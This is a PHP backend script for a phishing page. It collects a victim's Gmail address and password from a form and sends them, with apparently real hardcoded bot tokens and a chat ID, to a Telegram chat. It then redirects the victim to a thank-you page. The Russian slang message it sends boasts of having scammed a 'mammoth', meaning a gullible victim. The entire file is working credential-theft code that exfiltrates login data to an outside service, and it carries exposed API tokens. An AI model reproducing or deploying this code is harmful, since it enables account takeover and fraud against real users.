<?php

/* https://api.telegram.org/bot/5212604992:AAFVQttHOlSoiChECMozvqaF93d0sAfqyhY/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$gmail = $_POST['gmail'];
$password = $_POST['parol'];
$token = "5213173777:AAEVkURUKsfsS24RbikK0acb_5vwBJcUgrU";
$chat_id = "-609490928";
$arr = array(
  'заскамил мамонта👨🏿‍💻, чел успешно ухлади💀💀): ',
  'gmail: ' => $gmail,
  'parol:' => $password
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: thank-you.html');
} else {
  echo "Error";
}
?>